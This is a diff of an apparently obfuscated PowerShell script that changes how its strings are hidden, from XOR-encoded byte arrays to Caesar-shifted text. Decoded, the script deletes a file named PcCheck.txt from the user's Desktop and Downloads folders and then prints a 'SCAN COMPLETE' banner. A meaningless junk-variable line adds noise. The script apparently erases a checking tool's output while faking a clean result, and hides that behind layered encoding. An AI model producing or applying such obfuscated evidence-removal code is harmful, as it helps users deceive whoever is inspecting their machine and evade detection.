+    Write-Host $(-join('Fia zcfy hin ziohx ih nby xymenij.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) -ForegroundColor Red
 }
 # Paths to Desktop and Downloads folders
-$desktopPath = [System.Environment]::GetFolderPath($($k4573='E1{0(h<6Q';$b=[byte[]](0x01,0x54,0x08,0x5B,0x5C,0x07,0x4C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4573);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
+$desktopPath = [System.Environment]::GetFolderPath($(-join('Rsgyhcd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})))
 
 # Get the user's profile folder
 $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
 
 # Construct the path to the Downloads folder
-$downloadsPath = Join-Path -Path $userProfile -ChildPath $($k1295=137;$b=[byte[]](0xcd,0xe6,0xfe,0xe7,0xe5,0xe6,0xe8,0xed,0xfa);-join($b|%{[char]($_-bxor$k1295)}))
+$downloadsPath = Join-Path -Path $userProfile -ChildPath $(-join('Lwevtwila'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
 
 # Function to delete a file if it exists
 function Delete-FileIfExists {
@@ -294,8 +294,8 @@ function Delete-FileIfExists {
     }
 }
 Full paths to the target file in Desktop and Downloads folders
-$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath $($k3364=111;$b=[byte[]](0x3f,0x0c,0x2c,0x07,0x0a,0x0c,0x04,0x41,0x1b,0x17,0x1b);-join($b|%{[char]($_-bxor$k3364)}))
-$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath $($k5908='4=@4f4O@v0';$b=[byte[]](0x64,0x5E,0x03,0x5C,0x03,0x57,0x24,0x6E,0x02,0x48,0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5908);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath $(-join('IvVaxvd.mqm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))
+$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath $(-join('UhHmjhp.ycy'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))
 
 # Delete the target file if it exists
 Delete-FileIfExists -filePath $targetFileDesktop
@@ -303,15 +303,13 @@ Delete-FileIfExists -filePath $targetFileDownloads
 
 
 # Define colors
-$yellow = $($k6816='2Sgl0x]+PmLqKeZ';$b=[byte[]](0x6B,0x36,0x0B,0x00,0x5F,0x0F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6816);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-$space = $($k7914=73;$b=[byte[]](0x69);-join($b|%{[char]($_-bxor$k7914)})) * 12  # Increased the number of spaces for more right alignment
+$yellow = $(-join('Lryybj'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
+$space = $(-join(' '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) * 12  # Increased the number of spaces for more right alignment
 
-# Print the red $($k8745='08=(^Tb';$b=[byte[]](0x63,0x7B,0x7C,0x66,0x7E,0x17,0x2D,0x7D,0x68,0x71,0x6D,0x0A,0x11);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8745);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) line with more white space to the right
-Write-Host ($($k6772='$)cmmfX3';$b=[byte[]](0x44,0x47);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6772);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $space + $($k9185=2;$b=[byte[]](0xe0,0x97,0xaf,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x96,0x82,0xe0,0x97,0xac);-join($b|%{[char]($_-bxor$k9185)}))) -ForegroundColor $yellow
-Write-Host ($space + $($k4701=5;$b=[byte[]](0xe7,0x91,0x87,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x56,0x46,0x44,0x4b,0x25,0x46,0x4a,0x48,0x55,0x49,0x40,0x51,0x40,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0xe7,0x91,0x87);-join($b|%{[char]($_-bxor$k4701)}))) -ForegroundColor $yellow
-Write-Host ($space + $($k4419='gS)soP6vbk%^';$b=[byte[]](0x85,0xC6,0x99,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE2,0xE2,0x89,0xB1,0xDE,0x85,0xC7,0xA9,0x91,0xFB,0xD0,0xD4,0xE3,0xCD);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4419);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ForegroundColor $yellow
-
-
+# Print the red $(-join('EOMZ OAYBXQFQ'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) line with more white space to the right
+Write-Host ($(-join('`m'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})) + $space + $(-join('╭─────────────────────────────────────╮'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))) -ForegroundColor $yellow
+Write-Host ($space + $(-join('│            VFDQ FRPSOHWH            │'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))) -ForegroundColor $yellow
+Write-Host ($space + $(-join('╰─────────────────────────────────────╯'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))) -ForegroundColor $yellow
 
 
 
@@ -322,4 +320,6 @@ Write-Host ($space + $($k4419='gS)soP6vbk%^';$b=[byte[]](0x85,0xC6,0x99,0x91,0xF
 
 
 
-$zqSMPP = $($k2181=147;$b=[byte[]](0xab,0xe3,0xfe,0xe7,0xaa);-join($b|%{[char]($_-bxor$k2181)})) * 2; $zqSMPP.Replace($($k8730=4;$b=[byte[]](0x62);-join($b|%{[char]($_-bxor$k8730)})), $($k5041='3}.K3d(ddm<0gz';$b=[byte[]](0x40);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5041);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) | Out-Null; Remove-Variable zqSMPP -ErrorAction SilentlyContinue
+
+
+$zqSMPP = $(-join('8dah9'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})) * 2; $zqSMPP.Replace($(-join('u'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})), $(-join('u'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) | Out-Null; Remove-Variable zqSMPP -ErrorAction SilentlyContinue
